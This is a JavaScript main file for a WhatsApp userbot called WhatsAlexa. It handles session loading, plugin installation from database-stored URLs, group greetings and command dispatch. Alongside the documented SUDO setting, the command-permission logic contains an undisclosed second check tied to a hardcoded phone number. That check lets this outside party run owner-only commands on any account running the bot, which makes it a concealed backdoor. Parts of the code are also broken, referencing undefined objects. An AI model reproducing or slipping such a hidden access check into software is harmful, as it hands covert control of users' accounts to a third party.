const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./whatsalexa/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const AlexaModules = require('whatsalexa-npm');
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');


const WhatsAlexaDB = config.DATABASE.define('WhatsAlexa', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: ',0,94768826133' }

String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function Alexa () {
    const conn = new WAConnection();
    const Session = new StringSession();
    conn.version = [2, 2119, 6]

    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAlexaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });

    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;

    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }

    conn.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('🔁 CHECKING FOR COMMANDS...')
        );

        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAlexaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('WhatAlexa')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
${chalk.blue.italic('Made By TOXIC-DEVIL')}`);
    });
    

    conn.on('open', async () => {
        console.log(
            chalk.green.bold('🛑 NO COMMANDS FOUND!')
        );

        console.log(
            chalk.blueBright.italic('⬇️ INSTALLING COMMANDS...')
        );

        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        console.log(
            chalk.blueBright.italic('✅ COMMANDS INSTALLED SUCCESSFULLY!')
        );

        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });

        console.log(
            chalk.green.bold('🎉 BOT IS NOW ACTIVE IN YOUR ACCOUNT!')
        );
        
         if (config.LANG == 'EN') {
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { caption: `『 WhatsAlexa 』\n\nHello ${conn.user.name}!\n\n*🆘 General Help For You! 🆘*\n\n🔹 *#alive:* Check if the bot is running.\n\n🔹 *#list:* Shows the complete list of commands.\n\n🔹 *#restart:* It Restarts the bot.\n\n🔹 *#shutdown:* It Shutdown/Turn off the bot.\n\n *⚠ Warning, If you shutdown/turn off, there is no command to turn on the bot So You must got to heroku & turn on the worker. ⚠*.\n\nThank You For Using WhatsAlexa 💖`});
             
         } else if (config.LANG == 'ID') {
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { caption: `『 WhatsAlexa 』\n\nHalo ${conn.user.name}!\n\n*🆘 Bantuan umum 🆘*\n\n🔹 *#alive:* Periksa apakah bot sedang berjalan.\n\n🔹 *#list:* Menampilkan daftar lengkap perintah.\n\n🔹 *#restart:* Ini me-restart bot.\n\n🔹 *#shutdown:* Ini Matikan/Matikan bot.\n\n *⚠ Peringatan, Jika Anda mematikan/mematikan, tidak ada perintah untuk menghidupkan bot Jadi Anda harus pergi ke heroku & Nyalakan worker. ⚠*.\n\nTerima Kasih Telah Menggunakan WhatsAlexa 💖`});
             
         } else {
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { caption: `『 WhatsAlexa 』\n\nനമസ്കാരം ${conn.user.name}!\n\n*🆘 പൊതുവായ സഹായം 🆘*\n\n🔹 *#alive:* ബോട്ട് പ്രവർത്തിക്കുന്നുണ്ടോയെന്ന് പരിശോധിക്കുന്നു.\n\n🔹 *#list:* കമാൻഡുകളുടെ പൂർണ്ണ ലിസ്റ്റ് കാണിക്കുന്നു.\n\n🔹 *#restart:* ഇത് ബോട്ടിനെ പുനരാരംഭിപ്പിക്കുന്നു.\n\n🔹 *#shutdown:* ഇത് ഷട്ട്ഡൗൺ/ബോട്ട് ഓഫ് ചെയ്യുന്നു.\n\n *⚠ മുന്നറിയിപ്പ്, നിങ്ങൾ ഷട്ട്ഡൗൺ/ഓഫ് ചെയ്യുകയാണെങ്കിൽ, ബോട്ട് ഓണാക്കാൻ ഒരു കമാൻഡും ഇല്ല അതിനാൽ നിങ്ങൾ Heroku ഇല്പോയി worker ഓൺ ചെയ്യണം ⚠*.\n\nWhatsAlexa ഉപയോഗിച്ചതിന് നന്ദി 💖`});
        }
    });
    
    setInterval(async () => { 
        if (config.AUTOBIO == 'true') {
            var timezone_bio = await WhatsAsenaStack.timezone(WhatsAsenaCN.user.jid)
            var date_bio = await WhatsAsenaStack.datebio(config.LANG)
            const biography = '📅 ' + date_bio + '\n⌚ ' + timezone_bio + '\n\n⏱ Auto Bio By WhatsAlexa'
            await WhatsAsenaCN.setStatus(biography)
        }
    }, 7890);
    
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
         
        while (getGMTh == 19 && getGMTm == 1) {
            var announce = ''
            if (config.LANG == 'EN') announce = '📢 New Version ( V4 First Release ) Has been Released Rhight Now...\n\nAdded a Few more Features, This update was mainly for making codes encrypted with NPM 🥳'
            if (config.LANG == 'ML') announce = '📢 പുതിയ പതിപ്പ് ( V4 First Release ) ഇപ്പോൾ റിലീസ് ചെയ്തിരിക്കുന്നു...\n\nകുറച്ച് പുതിയ സവിശേഷതകൾ ചേർത്തു, ഈ അപ്ഡേറ്റ് പ്രധാനമായും NPM ഉപയോഗിച്ച് എൻക്രിപ്റ്റ് ചെയ്ത കോഡുകൾ ഉണ്ടാക്കുന്നതിനാണ്. 🥳'
            if (config.LANG == 'ID') announce = '📢 Versi Baru ( V4 First Release ) Telah Dirilis Sekarang...\n\nMenambahkan Beberapa Fitur lagi, Pembaruan ini terutama untuk membuat kodes yang dienkripsi dengan NPM 🥳'
            
            let video = ''
            let image = 'https://i.ibb.co/KGMms2Z/Whats-Alexa.jpg'
            
            if (video.includes('http') || video.includes('https')) {
                var VID = video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await conn.sendMessage(conn.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: announce, mimetype: Mimetype.mp4});
                });
            } else {
                if (image.includes('http') || image.includes('https')) {
                    var imagegen = await axios.get(image, { responseType: 'arraybuffer'})
                    return await conn.sendMessage(conn.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: announce })
                } else {
                    return await conn.sendMessage(conn.user.jid, announce, MessageType.text)
                }
            }
        }
    }, 50000);
    
    conn.on('message-new', async msg => {
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        if (config.BOT_PRESENCE == 'offline') {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        
        } else if (config.BOT_PRESENCE == 'online') {
            await conn.updatePresence(msg.key.remoteJid, Presence.available);
        
        } else if (config.BOT_PRESENCE == 'typing') {
            await conn.updatePresence(msg.key.remoteJid, Presence.composing);
        
        } else if (config.BOT_PRESENCE == 'recording') {
            await conn.updatePresence(msg.key.remoteJid, Presence.recording);
        } 
        
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // Görüşürüz Mesajı
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                if (gb.message.includes('{gpp}')) {
                    let ppUrl = await conn.getProfilePicture(msg.key.remoteJid) 
                    let nwjson = await conn.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
                    let user = '@' + msg.messageStubParameters[0].split('@')[0]
                    await conn.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { caption: gb.message.replace('{gpp}', '').replace('{@user}', user).replace('{botowner}', config.OWNER).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
                } else {
                    let nwjson = await conn.groupMetadata(msg.key.remoteJid)
                    let user = '@' + msg.messageStubParameters[0].split('@')[0]
                    let pp
                    try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                    await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                    await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{gname}', nwjson.subject).replace('{@user}', user).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', config.OWNER) }); });
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // Hoşgeldin Mesajı
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                if (gb.message.includes('{gpp}')) {
                    let ppUrl = await conn.getProfilePicture(msg.key.remoteJid) 
                    let nwjson = await conn.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
                    let user = '@' + msg.messageStubParameters[0].split('@')[0]
                    await conn.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { caption: gb.message.replace('{gpp}', '').replace('{@user}', user).replace('{botowner}', config.OWNER).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
                } else {
                    let nwjson = await conn.groupMetadata(msg.key.remoteJid)
                    let user = '@' + msg.messageStubParameters[0].split('@')[0]
                    let pp
                    try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                    await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                    await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{gname}', nwjson.subject).replace('{@user}', user).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', config.OWNER) }); });
            }
            return;
        }

        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == ",0,94768826133" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }

                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
                        if (msg.key.fromMe && command.deleteCommand) { 
                            var wrs = conn.user.phone.wa_version.split('.')[2]
                            if (wrs < 11) {
                                await whats.delete() 
                            }
                        } 

                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (config.LANG == 'EN') {
                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { caption: '*『 ERROR 』*\n\n*WhatsAlexa an error has occurred!*\n_Report this error to the developer! [ TOXIC-DEVIL ]._\n\n*Error:* ```' + error + '```\n\n' });
                                
                            } else if (config.LANG == 'ML') {
                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { caption: '*『 പിശക് 』*\n\n*WhatsAlexa പിശക് സംഭവിച്ചു!*\n_ഈ പിശക് ഡെവലപ്പറെ അറിയിക്കുക! [ TOXIC-DEVIL ]._\n\n*പിശക്:* ```' + error + '```\n\n' });
                                
                            } else {
                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { caption: '*『 KESALAHAN 』*\n\n*WhatsAlexa telah terjadi kesalahan!*\n_Laporkan kesalahan ini ke pengembang [ TOXIC-DEVIL ]._\n\n*Kesalahan:* ```' + error + '```\n\n' });
                            }
                        }
                    }
                }
            }
        )
    });

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('ERROR...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

Alexa();
